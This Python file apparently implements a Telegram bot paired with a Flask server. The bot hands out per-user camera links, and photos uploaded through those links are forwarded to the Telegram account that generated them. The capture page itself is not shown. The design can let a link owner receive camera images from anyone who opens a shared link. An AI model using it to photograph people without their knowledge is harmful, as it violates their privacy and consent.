import os
import threading
import logging
from flask import Flask, render_template, request, jsonify
import requests
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

logging.basicConfig(level=logging.INFO)

BOT_TOKEN = os.environ.get("BOT_TOKEN")
BASE_URL = "https://mangoq.onrender.com"

# Flask App
flask_app = Flask(__name__)

# ডেটা স্টোর
user_db = {}       # user_id -> TX code
code_to_userid = {}  # TX code -> user_id
counter_file = "counter.txt"

# =====================
# Helper Functions
# =====================

def get_next_counter():
    if os.path.exists(counter_file):
        with open(counter_file, "r") as f:
            count = int(f.read().strip())
    else:
        count = 99  # TX100 থেকে শুরু
    count += 1
    with open(counter_file, "w") as f:
        f.write(str(count))
    return count

def get_user_code(user_id):
    if user_id not in user_db:
        num = get_next_counter()
        code = f"TX{num}"
        user_db[user_id] = code
        code_to_userid[code] = user_id
    return user_db[user_id]

# =====================
# Flask Routes
# =====================

@flask_app.route("/s/mq/<code>")
def camera_page(code):
    return render_template("camera.html", code=code)

@flask_app.route("/upload/<code>", methods=["POST"])
def upload_photo(code):
    try:
        data = request.get_json()
        image_data = data.get("image")
        user_id = code_to_userid.get(code)

        if not user_id:
            return jsonify({"status": "error", "message": "Invalid code"}), 400

        if not image_data:
            return jsonify({"status": "error", "message": "No image"}), 400

        import base64
        header, encoded = image_data.split(",", 1)
        img_bytes = base64.b64decode(encoded)

        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        files = {"photo": ("photo.jpg", img_bytes, "image/jpeg")}
        payload = {"chat_id": user_id, "caption": "📷 নতুন ছবি এসেছে!"}
        response = requests.post(url, data=payload, files=files)

        if response.ok:
            return jsonify({"status": "success"})
        else:
            return jsonify({"status": "error"}), 500

    except Exception as e:
        return jsonify({"status": "error", "message": str(e)}), 500

@flask_app.route("/")
def index():
    return "MangoQ Bot Running ✅"

# =====================
# Telegram Bot Handlers
# =====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    code = get_user_code(user_id)
    link = f"{BASE_URL}/s/mq/{code}"

    keyboard = ReplyKeyboardMarkup(
        [[KeyboardButton("📷 ক্যামেরা")]],
        resize_keyboard=True
    )

    await update.message.reply_text(
        f"👋 স্বাগতম, {user.first_name}!\n\n"
        f"নিচের বাটনে ক্লিক করে তোমার ক্যামেরা লিংক পাও।",
        reply_markup=keyboard
    )

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text
    user_id = update.effective_user.id

    if text == "📷 ক্যামেরা":
        code = get_user_code(user_id)
        link = f"{BASE_URL}/s/mq/{code}"
        await update.message.reply_text(
            f"📷 তোমার ক্যামেরা লিংক:\n\n{link}\n\n"
            f"এই লিংকে ক্লিক করো, ছবি তোলো — সরাসরি এই বটে আসবে! ✅"
        )

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("✅ ছবি পেয়েছি! ধন্যবাদ।")

# =====================
# Run Both Together
# =====================

def run_flask():
    port = int(os.environ.get("PORT", 5000))
    flask_app.run(host="0.0.0.0", port=port)

def main():
    # Flask আলাদা thread এ চালাও
    t = threading.Thread(target=run_flask, daemon=True)
    t.start()

    # Telegram Bot চালাও
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.run_polling()

if __name__ == "__main__":
    main()
